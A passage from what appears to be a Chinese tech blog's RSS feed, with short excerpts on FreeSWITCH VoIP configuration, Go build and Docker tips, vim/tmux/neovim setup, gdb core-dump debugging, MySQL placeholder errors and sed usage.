虽然B在等待过程中，B的语音流依然再按照原始速度和编码再发给A, 即使这里面是环境噪音或者是无声。
A ----&amp;gt; B # A在说话 A &amp;lt;--- B # B在等待过程中，B的语音流依然再按照原始速度和编码再发给A 如果B具有VAD检测功能，那么B就可以在不说话的时候，发送特殊标记的语音流或者通过减少语音流发送的频率，来减少无意义语音的发送。
从而极大的降低B-&amp;gt;A的语音流。
下图是Wireshark抓包的两种RTP包，g711编码的占214字节，但是用舒适噪音编码的只有63字节。将近减少了4倍的带宽。
舒适噪音生成器 CNG 舒适噪音(CN stands for Comfort Noise), 是一种模拟的背景环境音。舒适噪音生成器在接收端根据发送到给的参数，来产生类似接收端的舒适噪音, 用来模拟发送方的噪音环境。
CN也是一种RTP包的格式，定义在RFC 3389
舒适噪音的payload, 也被称作静音插入描述帧(SID: a Silence Insertion Descriptor frame), 包括一个字节的数据，用来描述噪音的级别。也可以包含其他的额外的数据。早期版本的舒适噪音的格式定义在RFC 1890中，这个版本的格式只包含一个字段，就是噪音级别。
噪音级别占用一个字节，其中第一个bit必须是0， 因此噪音级别有127中可能。
0 1 2 3 4 5 6 7 +-+-+-+-+-+-+-+-+ |0| level | +-+-+-+-+-+-+-+-+ 跟着噪音级别的后续字节都是声音的频谱信息。
Byte 1 2 3 ... M+1 +-----+-----+-----+-----+-----+ |level| N1 | N2 | .</description>
    </item>
    
    <item>
      <title>在二进制文件中注入版本信息</title>
      <link>https://wdd.js.org/golang/inject-version/</link>
      <pubDate>Sat, 28 May 2022 21:47:41 +0800</pubDate>
      
      <guid>https://wdd.js.org/golang/inject-version/</guid>
      <description>暴露的变量必须用var定义，不能用const定义
// main.go var VERSION = &amp;#34;unknow&amp;#34; var SHA = &amp;#34;unknow&amp;#34; var BUILD_TIME = &amp;#34;unknow&amp;#34; ... func main () { app := &amp;amp;cli.App{ Version: VERSION + &amp;#34;\r\nsha: &amp;#34; + SHA + &amp;#34;\r\nbuild time: &amp;#34; + BUILD_TIME, ... } Makefile
tag?=v0.0.5 DATE?=$(shell date +%FT%T%z) VERSION_HASH = $(shell git rev-parse HEAD) LDFLAGS=&amp;#39;-X &amp;#34;main.VERSION=$(tag)&amp;#34; -X &amp;#34;main.SHA=$(VERSION_HASH)&amp;#34; -X &amp;#34;main.BUILD_TIME=$(DATE)&amp;#34;&amp;#39; build: CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags $(LDFLAGS) -o wellcli main.go 执行make build, 产生的二进制文件，就含有注入的信息了。
-ldflags &amp;#39;[pattern=]arg list&amp;#39; arguments to pass on each go tool link invocation.</description>
    </item>
    
    <item>
      <title>Golang Dockerfile</title>
      <link>https://wdd.js.org/golang/scratch-dockerfile/</link>
      <pubDate>Sat, 28 May 2022 21:45:48 +0800</pubDate>
      
      <guid>https://wdd.js.org/golang/scratch-dockerfile/</guid>
      <description>FROM golang:1.16.2 as builder ENV GO111MODULE=on GOPROXY=https://goproxy.cn,direct WORKDIR /app COPY . . RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build . FROM scratch WORKDIR /app COPY --from=builder /app/your_app . # 配置时区 COPY --from=builder /usr/share/zoneinfo /usr/share/zoneinfo ENV TZ=Asia/Shanghai EXPOSE 8080 ENTRYPOINT [&amp;#34;./your_app&amp;#34;] </description>
    </item>
    
    <item>
      <title>Hugo博客常见问题以及解决方案</title>
      <link>https://wdd.js.org/posts/2022/hugo-blog-faq/</link>
      <pubDate>Sat, 28 May 2022 21:08:43 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2022/hugo-blog-faq/</guid>
      <description>如何在markdown中插入图片 在static 目录中创建 images 目录，然后把图片放到images目录中。
在文章中引用的时候
![](/images/qianxun.jpeg#center) Warning 我之前创建的文件夹的名字叫做 img, 本地可以正常显示，但是部署之后，就无法显示图片了。
最后我把img改成images才能正常在网页上显示。</description>
    </item>
    
    <item>
      <title>安装bcg729模块</title>
      <link>https://wdd.js.org/freeswitch/install-bcg729/</link>
      <pubDate>Sat, 28 May 2022 17:34:13 +0800</pubDate>
      
      <guid>https://wdd.js.org/freeswitch/install-bcg729/</guid>
      <description>g729编码的占用带宽是g711的1/8，使用g729编码，可以极大的降低带宽的费用。fs原生的mod_g927模块是需要按并发数收费的，但是我们可以使用开源的bcg729模块。
这里需要准备两个仓库，为了加快clone速度，我将这两个模块导入到gitee上。
https://gitee.com/wangduanduan/mod_bcg729 https://gitee.com/wangduanduan/bcg729 安装前提 已经安装好了freeswitch, 编译mod_bcg729模块，需要指定freeswitch头文件的位置
step0: 切换到工作目录 cd /usr/local/src/ step1: clone mod_bcg729 git clone https://gitee.com/wangduanduan/mod_bcg729.git step2: clone bcg729 mod_bcg729模块在编辑的时候，会检查当前目录下有没有bcg729的目录。 如果没有这个目录，就会从github上clone bcg729的项目。 所以我们可以在编译之前，先把bcg729 clone到mob_bcg729目录下
cd mod_bcg729 git clone https://gitee.com/wangduanduan/bcg729.git step3: 编辑mod_bcg729 编译mod_bcg729需要指定fs头文件switch.h的位置。 在Makefile项目里有FS_INCLUDES这个变量用来定义fs头文件的位置
FS_INCLUDES=/usr/include/freeswitch FS_MODULES=/usr/lib/freeswitch/mod 如果你的源码头文件路径不是/usr/include/freeswitch， 则需要在执行make命令时通过参数指定， 例如下面编译的时候。
make FS_INCLUDES=/usr/local/freeswitch/include/freeswitch Tip 如何找到头文件的目录？ 头文件一般在fs安装目录的include/freeswitch目录下 如果还是找不到，则可以使用 find /usr -name switch.h -type f 搜索对应的头文件 step4: 复制so文件 mod_bcg729编译之后，可以把生成的mod_bcg729.so拷贝到fs安装目录的mod目录下
step5: 加载模块 命令行加载
load mod_bcg729 配置文件加载 命令行加载重启后就失效了，可以将加载的模块写入到配置文件中。 在modules.conf.xml中加入
&amp;lt;load module=&amp;#34;mod_bcg729&amp;#34;/&amp;gt; step5: vars.xml修改 &amp;lt;X-PRE-PROCESS cmd=&amp;#34;set&amp;#34; data=&amp;#34;global_codec_prefs=PCMU,PCMA,G729&amp;#34; /&amp;gt; &amp;lt;X-PRE-PROCESS cmd=&amp;#34;set&amp;#34; data=&amp;#34;outbound_codec_prefs=PCMU,PCMA,G729&amp;#34;/&amp;gt; &amp;lt;X-PRE-PROCESScmd=&amp;#34;set&amp;#34;data=&amp;#34;media_mix_inbound_outbound_codecs=true&amp;#34;/&amp;gt; step6: sip profile修改 开启转码</description>
    </item>
    
    <item>
      <title>会议提示音无法正常播放</title>
      <link>https://wdd.js.org/freeswitch/conference-announce/</link>
      <pubDate>Sat, 28 May 2022 17:17:54 +0800</pubDate>
      
      <guid>https://wdd.js.org/freeswitch/conference-announce/</guid>
      <description>呼入到会议，正常来说，当会议室有且只有一人时，应该会报“当前只有一人的提示音”。但是测试的时候，输入了密码，进入了会议，却没有播报正常的提示音。
经过排查发现，dialplan中，会议室的名字中含有@符号。
按照fs的文档，发现@后面应该是profilename, 然而fs的conference.conf.xml却没有这个profile, 进而导致语音无法播报的问题。所以只要加入这个profile, 或者直接用@default, 就可以正确的播报语音了。
Action data Description confname profile is &amp;ldquo;default&amp;rdquo;, no flags or pin confname+1234 profile is &amp;ldquo;default&amp;rdquo;, pin is 1234 confname@profilename+1234 profile is &amp;ldquo;profilename&amp;rdquo;, pin=1234, no flags confname+1234+flags{mute} profile is &amp;ldquo;default&amp;rdquo;, pin=1234, one flag confname++flags{endconf|moderator} profile is &amp;ldquo;default&amp;rdquo;, no p.i.n., multiple flags bridge:confname:1000@${domain_name} a &amp;ldquo;bridging&amp;rdquo; conference, you must provide another endpoint, or &amp;rsquo;none&#39;. bridge:uuid:none a &amp;ldquo;bridging&amp;rdquo; conference with UUID assigned as conference name 所以，当你遇到问题的时候，应该仔细的再去阅读一下官方的接口文档。
参考文档</description>
    </item>
    
    <item>
      <title>FS日志设置</title>
      <link>https://wdd.js.org/freeswitch/log-settings/</link>
      <pubDate>Sat, 28 May 2022 17:14:05 +0800</pubDate>
      
      <guid>https://wdd.js.org/freeswitch/log-settings/</guid>
      <description>开启sip信令的日志 这样会让fs把收发的sip信令打印到fs_cli里面，但不是日志文件里面
sofia global siptrace on # sofia global siptrace off 关闭 开启sofia模块的日志 sofia 模块的日志即使开启，也是输出到fs_cli里面的，不会输出到日志文件里面
sofia loglevel all 7 # sofia loglevel &amp;lt;all|default|tport|iptsec|nea|nta|nth_client|nth_server|nua|soa|sresolv|stun&amp;gt; [0-9] 将fs_cli的输出，写到日志文件里 sofia tracelevel 会将某些日志重定向到日志文件里 sofia tracelevel debug # sofia tracelevel &amp;lt;console|alert|crit|err|warning|notice|info|debug&amp;gt; 注意，debug级别的日志非常多，仅仅适用于debug
大量的日志写入磁盘
占用太多的io 磁盘空间可能很快占满 </description>
    </item>
    
    <item>
      <title>Sofia 模块全部配置</title>
      <link>https://wdd.js.org/freeswitch/sofia-config/</link>
      <pubDate>Sat, 28 May 2022 14:57:59 +0800</pubDate>
      
      <guid>https://wdd.js.org/freeswitch/sofia-config/</guid>
      <description>About Sofia is a FreeSWITCH™ module (mod_sofia) that provides SIP connectivity to and from FreeSWITCH in the form of a User Agent. A &amp;ldquo;User Agent&amp;rdquo; (&amp;ldquo;UA&amp;rdquo;) is an application used for handling a certain network protocol; the network protocol in Sofia&amp;rsquo;s case is SIP. Sofia is the general name of any User Agent in FreeSWITCH using the SIP network protocol. For example, Sofia receives calls sent to FreeSWITCH from other SIP User Agents (UAs), sends calls to other UAs, acts as a client to register FreeSWITCH with other UAs, lets clients register with FreeSWITCH, and connects calls (i.</description>
    </item>
    
    <item>
      <title>FS常用运维手册</title>
      <link>https://wdd.js.org/freeswitch/tips/</link>
      <pubDate>Sat, 28 May 2022 14:54:40 +0800</pubDate>
      
      <guid>https://wdd.js.org/freeswitch/tips/</guid>
      <description>安装单个模块 make mod_sofia-install make mod_ilbc-install fs-cli事件订阅 /event plain ALL /event plain CHANNEL_ANSWER sofia 帮助文档 sofia help USAGE: -------------------------------------------------------------------------------- sofia global siptrace &amp;lt;on|off&amp;gt; sofia capture &amp;lt;on|off&amp;gt; watchdog &amp;lt;on|off&amp;gt; sofia profile &amp;lt;name&amp;gt; [start | stop | restart | rescan] [wait] flush_inbound_reg [&amp;lt;call_id&amp;gt; | &amp;lt;[user]@domain&amp;gt;] [reboot] check_sync [&amp;lt;call_id&amp;gt; | &amp;lt;[user]@domain&amp;gt;] [register | unregister] [&amp;lt;gateway name&amp;gt; | all] killgw &amp;lt;gateway name&amp;gt; [stun-auto-disable | stun-enabled] [true | false]] siptrace &amp;lt;on|off&amp;gt; capture &amp;lt;on|off&amp;gt; watchdog &amp;lt;on|off&amp;gt; sofia &amp;lt;status|xmlstatus&amp;gt; profile &amp;lt;name&amp;gt; [reg [&amp;lt;contact str&amp;gt;]] | [pres &amp;lt;pres str&amp;gt;] | [user &amp;lt;user@domain&amp;gt;] sofia &amp;lt;status|xmlstatus&amp;gt; gateway &amp;lt;name&amp;gt; sofia loglevel &amp;lt;all|default|tport|iptsec|nea|nta|nth_client|nth_server|nua|soa|sresolv|stun&amp;gt; [0-9] sofia tracelevel &amp;lt;console|alert|crit|err|warning|notice|info|debug&amp;gt; sofia help -------------------------------------------------------------------------------- 开启消息头压缩 &amp;lt;param name=&amp;#34;enable-compact-headers&amp;#34; value=&amp;#34;true&amp;#34;/&amp;gt; fs需要重启</description>
    </item>
    
    <item>
      <title>FreeSWITCH 媒体相关操作</title>
      <link>https://wdd.js.org/freeswitch/media-settings/</link>
      <pubDate>Sat, 28 May 2022 14:50:55 +0800</pubDate>
      
      <guid>https://wdd.js.org/freeswitch/media-settings/</guid>
      <description>查看FS支持的编码 show codec 编码设置 vars.xml
global_codec_prefs=G722,PCMU,PCMA,GSM outbound_codec_prefs=PCMU,PCMA,GSM 查看FS使用的编码 &amp;gt; sofia status profile internal CODECS IN ILBC,PCMU,PCMA,GSM CODECS OUT ILBC,PCMU,PCMA,GSM &amp;gt; sofia status profile external CODECS IN ILBC,PCMU,PCMA,GSM CODECS OUT ILBC,PCMU,PCMA,GSM 使修改后的profile生效 &amp;gt; sofia profile internal rescan &amp;gt; sofia profile external rescan 重启profile &amp;gt; sofia profile internal restart &amp;gt; sofia profile external restart </description>
    </item>
    
    <item>
      <title>Shell 教程技巧</title>
      <link>https://wdd.js.org/posts/2022/shell-101/</link>
      <pubDate>Sat, 28 May 2022 12:39:50 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2022/shell-101/</guid>
      <description>复制文本到剪贴板 sudo apt install xclip vim ~/.zshrc
alias copy=&amp;#39;xclip -selection clipboard&amp;#39; 这样我们就可以用copy命令来考本文件内容到系统剪贴板了。
copy aaa.txt 判断工作区是否clean if [ -z &amp;#34;$(git status --porcelain)&amp;#34; ]; then # Working directory clean else # Uncommitted changes fi </description>
    </item>
    
    <item>
      <title>C和gdb调试</title>
      <link>https://wdd.js.org/posts/2022/c-and-gdb/</link>
      <pubDate>Sat, 28 May 2022 12:35:26 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2022/c-and-gdb/</guid>
      <description>开启coredump #如果该命令的返回值是0，则表示不开启coredump ulimit -c # 开启coredump ulimit -c unlimited 准备c文件 #include&amp;lt;stdio.h&amp;gt; void crash() { char * p = NULL; *p = 0; } int main(){ printf(&amp;#34;hello world 1&amp;#34;); int phone [4]; phone[232] = 12; crash(); return 0; } 编译执行 gcc -g hello.c -o hello ./hello 之后程序崩溃，产生core文件。
gdb分析 gdb 启动的二进制文件 core文件
gdb ./hello ./core 之后输入： bt full 可以查看到更详细的信息
➜ c-sandbox gdb ./hello ./core GNU gdb (Raspbian 7.12-6) 7.12.0.20161007-git Copyright (C) 2016 Free Software Foundation, Inc.</description>
    </item>
    
    <item>
      <title>Tmux 常见问题以及解决方案</title>
      <link>https://wdd.js.org/posts/2022/tmux-faq/</link>
      <pubDate>Sat, 28 May 2022 12:30:58 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2022/tmux-faq/</guid>
      <description>oh my tmux 关闭第二键ctrl-a ctrl-a可以用来移动光标到行首的，不要作为tmux的第二键
set -gu prefix2 unbind C-a Tmux reload config :source-file ～/.tmux.conf tmux 显示时间 ctrl b + t tmux从当前目录打开新的窗口 bind &amp;#39;&amp;#34;&amp;#39; split-window -c &amp;#34;#{pane_current_path}&amp;#34; bind % split-window -h -c &amp;#34;#{pane_current_path}&amp;#34; bind c new-window -c &amp;#34;#{pane_current_path}&amp;#34; </description>
    </item>
    
    <item>
      <title>Vim 常见问题以及解决方案</title>
      <link>https://wdd.js.org/vim/vim-faq/</link>
      <pubDate>Sat, 28 May 2022 12:21:47 +0800</pubDate>
      
      <guid>https://wdd.js.org/vim/vim-faq/</guid>
      <description>修改coc-vim的错误提示 coc-vim的错误提示窗口背景色是粉红，前景色是深红。这样的掩饰搭配，很难看到具体的文字颜色。
所以我们需要把前景色改成白色。
:highlight CocErrorFloat ctermfg=White 参考 https://stackoverflow.com/questions/64180454/how-to-change-coc-nvim-floating-window-colors
vim go一直卡在初始化 有可能没有安装二进制工具
:GoInstallBinaries neovim 光标变成细线解决方案 :set guicursor= </description>
    </item>
    
    <item>
      <title>vscode vim插件自定义快捷键</title>
      <link>https://wdd.js.org/vim/vscode-vim/</link>
      <pubDate>Sat, 28 May 2022 11:20:30 +0800</pubDate>
      
      <guid>https://wdd.js.org/vim/vscode-vim/</guid>
      <description>我承认，vscode很香，但是vim的开发方式也让我无法割舍。
vscode中有个vim插件，基本上可以满足大部分vim的功能。
这里我定义了我在vim常用的leader快捷键。
设置,为默认的leader &amp;#34;vim.leader&amp;#34;: &amp;#34;,&amp;#34;, 在Normal模式能comand+c复制 &amp;#34;vim.handleKeys&amp;#34;: { &amp;#34;&amp;lt;C-c&amp;gt;&amp;#34;: false, &amp;#34;&amp;lt;C-v&amp;gt;&amp;#34;: false }, leader快捷键 在插入模式安jj会跳出插入模式 ,a: 跳到行尾部，并进入插入模式 ,c: 关闭当前标签页 ,C: 关闭其他标签页 ,j: 跳转到左边标签页 ,k: 跳转到右边标签页 ,w: 保存文件 ,t: 给出提示框 ,b: 显示或者隐藏文件树窗口 完整的配置 &amp;#34;vim.leader&amp;#34;: &amp;#34;,&amp;#34;, &amp;#34;vim.insertModeKeyBindings&amp;#34;: [ { &amp;#34;before&amp;#34;: [ &amp;#34;j&amp;#34;, &amp;#34;j&amp;#34; ], &amp;#34;after&amp;#34;: [ &amp;#34;&amp;lt;Esc&amp;gt;&amp;#34; ] } ], &amp;#34;vim.handleKeys&amp;#34;: { &amp;#34;&amp;lt;C-c&amp;gt;&amp;#34;: false, &amp;#34;&amp;lt;C-v&amp;gt;&amp;#34;: false }, &amp;#34;vim.normalModeKeyBindingsNonRecursive&amp;#34;: [ { &amp;#34;before&amp;#34;: [ &amp;#34;&amp;lt;leader&amp;gt;&amp;#34;, &amp;#34;a&amp;#34; ], &amp;#34;after&amp;#34;: [ &amp;#34;A&amp;#34; ] }, { &amp;#34;before&amp;#34;: [ &amp;#34;&amp;lt;leader&amp;gt;&amp;#34;, &amp;#34;c&amp;#34; ], &amp;#34;commands&amp;#34;: [ &amp;#34;workbench.</description>
    </item>
    
    <item>
      <title>和系统剪贴板进行交互</title>
      <link>https://wdd.js.org/vim/clipboard/</link>
      <pubDate>Sat, 28 May 2022 10:59:03 +0800</pubDate>
      
      <guid>https://wdd.js.org/vim/clipboard/</guid>
      <description>neovim如何与系统剪贴板交互？ neovim和系统剪贴板的交互方式和vim的机制是不同的，所以不要先入为主的用vim的方式使用neovim。
neovim需要外部的程序与系统剪贴板进行交互，参考:help clipboard
neovim按照如下的优先级级方式选择交互程序：
- |g:clipboard| - pbcopy, pbpaste (macOS) - wl-copy, wl-paste (if $WAYLAND_DISPLAY is set) - xclip (if $DISPLAY is set) - xsel (if $DISPLAY is set) - lemonade (for SSH) https://github.com/pocke/lemonade - doitclient (for SSH) http://www.chiark.greenend.org.uk/~sgtatham/doit/ - win32yank (Windows) - termux (via termux-clipboard-set, termux-clipboard-set) - tmux (if $TMUX is set) 因为我的操作系统是linux, 所以方便的方式是直接安装xclip。
sudo pacman -Syu xclip 两个系统剪贴板有何不同？ 对于windows和mac来说，只有有一个系统剪贴板，对于linux有两个。
剪贴板，鼠标选择剪贴板 剪贴板，选择之后复制剪贴板 如下图，我用鼠标选择了12345, 但是没有按ctrl + c, 这时候你打开nvim， 执行:reg, 可以看到注册器</description>
    </item>
    
    <item>
      <title>搜索工作目录下的文件并替换</title>
      <link>https://wdd.js.org/vim/search-dir-replace/</link>
      <pubDate>Sat, 28 May 2022 10:35:58 +0800</pubDate>
      
      <guid>https://wdd.js.org/vim/search-dir-replace/</guid>
      <description>在vscode中，可以选中一个目录，然后在目录中搜索对应的关键词，再查找到对应文件中，然后做替换。
在vim也可以这样做。
但是这件事要分成两步。
根据关键词，查找文件 对多个文件进行替换 搜索关键词 搜索关键词可以用grep, 或者vim自带的vimgrep。
但是我更喜欢用ripgrep，因为速度很快。
ripgrep也有对应的vim插件 https://github.com/jremmen/vim-ripgrep
例如要搜索关键词 key1, 那么符合关键词的文件将会被放到quickfix列表中。
:Rg key1 可以用 :copen 来打开quickfix列表。
替换 cdo :cdo %s/key1/key2/gc c表示在替换的时候，需要手工确认每一项。
在替换的时候，可以输入
y (yes)执行替换 n (no)忽略此处替换 a (all)替换此处和之后的所有项目 q (quit) 退出替换过程 l (last) 替换此处后退出 ^E 向上滚动屏幕 ^Y 向下滚动屏幕 </description>
    </item>
    
    <item>
      <title>1001个Vim高级技巧 - 0-55</title>
      <link>https://wdd.js.org/vim/vim-tips/</link>
      <pubDate>Fri, 27 May 2022 19:25:48 +0800</pubDate>
      
      <guid>https://wdd.js.org/vim/vim-tips/</guid>
      <description>Info C表示按住Ctrl, C-o表示同时按住Ctrl和o 1. 在tmux中 vim-airline插件颜色显示不正常 解决方案：
export TERM=screen-256color 2. buffer相关操作 :ls # 显示所有打开的buffer :b {bufferName} #支持tab键自动补全 :bd # 关闭当前buffer :bn # 切换到下一个buffer :bp # 切换到上一个buffer :b# # 切换到上一个访问过的buffer :b1 # 切换到buffer1 :bm # 切换到最近修改过的buffer :sb {bufferName} # 上下分屏 :vert sb {bufferName} # 左右分屏 3. 跳转到对应的符号上 下面这种符号，一般都是成双成对的，只要在其中一个上按%, 就会自动跳转到对应的符号
() [] {} 4. 关闭netrw的banner 如果熟练的是用了netrw，就可以把默认开启的banner给关闭掉。
let g:netrw_banner = 0 let g:netrw_liststyle = 3 let g:netrw_winsize = 25 5. 如何同时保存所有发生变化的文件？ 把所有发生变化的文件给保存 :wa 把所有发生变化的文件都保存，然后退出vim :xa 退出vim, 所有发生变化的文件都不保存，:qa!</description>
    </item>
    
    <item>
      <title>hugo博客增加mermaid 绘图插件</title>
      <link>https://wdd.js.org/posts/2022/02-hugo-add-mermaid/</link>
      <pubDate>Fri, 27 May 2022 11:49:44 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2022/02-hugo-add-mermaid/</guid>
      <description>增加mermaid shortcodes 在themes/YourTheme/layouts/shortcodes/mermaid.html 增加如下内容
&amp;lt;script async type=&amp;#34;application/javascript&amp;#34; src=&amp;#34;https://cdn.jsdelivr.net/npm/mermaid@9.1.1/dist/mermaid.min.js&amp;#34;&amp;gt; var config = { startOnLoad:true, theme:&amp;#39;{{ if .Get &amp;#34;theme&amp;#34; }}{{ .Get &amp;#34;theme&amp;#34; }}{{ else }}dark{{ end }}&amp;#39;, align:&amp;#39;{{ if .Get &amp;#34;align&amp;#34; }}{{ .Get &amp;#34;align&amp;#34; }}{{ else }}center{{ end }}&amp;#39; }; mermaid.initialize(config); &amp;lt;/script&amp;gt; &amp;lt;div class=&amp;#34;mermaid&amp;#34;&amp;gt; {{.Inner}} &amp;lt;/div&amp;gt; 在blog中增加如下代码 Warning 注意下面的代码，你在实际写的时候，要把 /* 和 */ 删除 {{/*&amp;lt; mermaid align=&amp;#34;left&amp;#34; theme=&amp;#34;neutral&amp;#34; */&amp;gt;}} pie title French Words I Know &amp;#34;Merde&amp;#34; : 50 &amp;#34;Oui&amp;#34; : 35 &amp;#34;Alors&amp;#34; : 10 &amp;#34;Non&amp;#34; : 5 {{/*&amp;lt; /mermaid &amp;gt;*/}} pie title French Words I Know &#34;</description>
    </item>
    
    <item>
      <title>我常用的第三方库</title>
      <link>https://wdd.js.org/golang/my-start-repo/</link>
      <pubDate>Fri, 08 Oct 2021 21:32:13 +0800</pubDate>
      
      <guid>https://wdd.js.org/golang/my-start-repo/</guid>
      <description>web框架 https://github.com/gofiber/fiber http client https://github.com/go-resty/resty mock https://github.com/jarcoal/httpmock 项目结构 https://github.com/golang-standards/project-layout 环境变量操作 https://github.com/caarlos0/env https://github.com/kelseyhightower/envconfig 测试框架 https://github.com/stretchr/testify 日志框架 https://github.com/uber-go/zap html解析 https://github.com/PuerkitoBio/goquery cli工具 https://github.com/urfave/cli 各种库大全集 https://github.com/avelino/awesome-go 终端颜色 https://github.com/fatih/color 剪贴板 https://github.com/atotto/clipboard 数据库驱动 https://github.com/go-sql-driver/mysql 热重载 https://github.com/cosmtrek/air 时间处理 https://github.com/golang-module/carbon 错误封装 https://github.com/pkg/errors 结构体转二进制 https://github.com/lunixbochs/struc VIM智能补全提示 需要安装coc-go, 还有vim-go</description>
    </item>
    
    <item>
      <title>mysql placeholder的错误使用方式</title>
      <link>https://wdd.js.org/golang/mysql-placeholder/</link>
      <pubDate>Sun, 03 Oct 2021 21:52:40 +0800</pubDate>
      
      <guid>https://wdd.js.org/golang/mysql-placeholder/</guid>
      <description> Error EXTRA *mysql.MySQLError=Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;lsquo;? ( 然而我仔细看了看sql语句，没有看出来究竟哪里有sql报错。
然而当我把作为placeholder的问号去掉，直接用表的名字，sql是可以直接执行的。我意识到这个可能是和placeholder有关。
搜索了一下，看到一个链接 https://github.com/go-sql-driver/mysql/issues/848
Placeholder can&amp;rsquo;t be used for table name or column name. It&amp;rsquo;s MySQL spec. Not bug of this project.
大意是说，placeholder是不能作为表名或者列名的。
在mysql关于prepared文档介绍中，在允许使用prepared的语句里，没有看到create table可以用placeholder https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html
prepared语句的优点有以下几个
优化查询速度 防止sql注入 但是也有一些限制
不是所有语句都能用prepared语句。常见的用法应该是作为select where之后的条件，或者INSERT语句之后的值 不支持一个sql中多条查询语句的形式 </description>
    </item>
    
    <item>
      <title>Debug With Dlv</title>
      <link>https://wdd.js.org/golang/debug-with-dlv/</link>
      <pubDate>Sat, 07 Aug 2021 21:50:05 +0800</pubDate>
      
      <guid>https://wdd.js.org/golang/debug-with-dlv/</guid>
      <description>本来打算用gdb调试的，看了官方的文档https://golang.org/doc/gdb， 官方更推荐使用delve这个工具调试。
我的电脑是linux, 所以就用如下的命令安装。
go install github.com/go-delve/delve/cmd/dlv@latest
我要调试的并不是一个代码而是一个测试的代码。
当执行测试的时候报错的位置是xxx/demo/demo_test.go, 200行
dlv test moduleName/demo &amp;gt; b demo_test.go:200 # 在文件的对应行设置端点 &amp;gt; bp # print all breakpoint &amp;gt; c # continue to exe &amp;gt; p variableName </description>
    </item>
    
    <item>
      <title>Golang学习资料</title>
      <link>https://wdd.js.org/golang/learn-material/</link>
      <pubDate>Sun, 18 Jul 2021 21:39:59 +0800</pubDate>
      
      <guid>https://wdd.js.org/golang/learn-material/</guid>
      <description>在线书籍 《Go语言原本》https://golang.design/under-the-hood/ 《Golang修养之路》https://www.kancloud.cn/aceld/golang 《Go语言高性能编程》https://geektutu.com/post/high-performance-go.html 《7天用Go从零实现Web框架Gee教程》https://geektutu.com/post/gee.html 博客关注 https://carlosbecker.com/ https://www.alexedwards.net/blog https://gobyexample.com/ 文章收藏 https://carlosbecker.com/posts/env-structs-golang https://www.alexedwards.net/blog/json-surprises-and-gotchas https://www.alexedwards.net/blog/how-to-manage-database-timeouts-and-cancellations-in-go https://www.alexedwards.net/blog/custom-command-line-flags https://www.alexedwards.net/blog/how-to-properly-parse-a-json-request-body https://www.alexedwards.net/blog/working-with-redis https://www.alexedwards.net/blog/organising-database-access https://www.alexedwards.net/blog/interfaces-explained </description>
    </item>
    
    <item>
      <title>Js Trailing Commas</title>
      <link>https://wdd.js.org/fe/js-trailing-commas/</link>
      <pubDate>Sat, 10 Jul 2021 14:03:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/fe/js-trailing-commas/</guid>
      <description>简介 看下面的代码，如果我们要新增加一行&amp;quot;ccc&amp;quot;, 实际我们的目的是增加一行，但是对于像git这种版本控制系统来说，我们改动了两行。
第三行进行了修改 第四行增加了 我们为什么要改动两行呢？因为如果不在第三行上的末尾加上逗号就增加第四行，则会报错语法错误。
var names = [ &amp;#34;aaa&amp;#34;, &amp;#34;bbb&amp;#34; ] var names = [ &amp;#34;aaa&amp;#34;, &amp;#34;bbb&amp;#34;, &amp;#34;ccc&amp;#34; ] 尾逗号的提案就是允许再一些场景下，允许再尾部增加逗号。
var name = [ &amp;#34;aaa&amp;#34;, &amp;#34;bbb&amp;#34;, ] 那么我们再新增加一行的情况下，则只需要增加一行，而不需要修改之前行的代码。
var name = [ &amp;#34;aaa&amp;#34;, &amp;#34;bbb&amp;#34;, &amp;#34;ccc&amp;#34;, ] 兼容性 除了IE浏览器没有对尾逗号全面支持以外，其他浏览器以及Node环境都已经全满支持 JSON是不支持尾逗号的，尾逗号只能在代码里面用 注意在包含尾逗号时数组长度的计算 [,,,].length // 3 [,,,1].length // 4 [,,,1,].length // 4 [1,,,].lenght // 3 使用场景 数组中使用 var abc = [ 1, 2, 3, ] 对象字面量中使用 var info = { name: &amp;#34;li&amp;#34;, age: 12, } 作为形参使用 function say ( name, age, ) { } 作为实参使用 say( &amp;#34;li&amp;#34;, 12, ) 在import中使用 import { A, B, C, } from &amp;#39;D&amp;#39; 参考 https://developer.</description>
    </item>
    
    <item>
      <title>sed替换</title>
      <link>https://wdd.js.org/shell/sed-tips/</link>
      <pubDate>Thu, 08 Jul 2021 09:17:30 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/sed-tips/</guid>
      <description>直接在原文的基础上修改 sed -i &amp;#39;s/ABC/abc/g&amp;#39; some.txt 多次替换 方案1 使用分号 sed &amp;#39;s/ABC/abc/g;s/DEF/def/g&amp;#39; some.txt 方案2 多次使用-e sed -e &amp;#39;s/ABC/abc/g&amp;#39; -e &amp;#39;s/DEF/def/g&amp;#39; some.txt 转译/ 如果替换或者被替换的字符中本来就有/, 那么替换就会无法达到预期效果，那么我们可以用其他的字符来替代/。
The / characters may be uniformly replaced by any other single character within any given s command. The / character (or whatever other character is used in its stead) can appear in the regexp or replacement only if it is preceded by a \ character. https://www.gnu.org/software/sed/manual/sed.html
# 可以用#来替代/ sed &amp;#39;s#ABC#de/#g&amp;#39; some.</description>
    </item>
    
    <item>
      <title>sed替换</title>
      <link>https://wdd.js.org/shell/set-replace/</link>
      <pubDate>Thu, 08 Jul 2021 09:17:30 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/set-replace/</guid>
      <description>直接在原文的基础上修改 sed -i &amp;#39;s/ABC/abc/g&amp;#39; some.txt 多次替换 方案1 使用分号 sed &amp;#39;s/ABC/abc/g;s/DEF/def/g&amp;#39; some.txt 方案2 多次使用-e sed -e &amp;#39;s/ABC/abc/g&amp;#39; -e &amp;#39;s/DEF/def/g&amp;#39; some.txt 转译/ 如果替换或者被替换的字符中本来就有/, 那么替换就会无法达到预期效果，那么我们可以用其他的字符来替代/。
The / characters may be uniformly replaced by any other single character within any given s command. The / character (or whatever other character is used in its stead) can appear in the regexp or replacement only if it is preceded by a \ character. https://www.gnu.org/software/sed/manual/sed.html
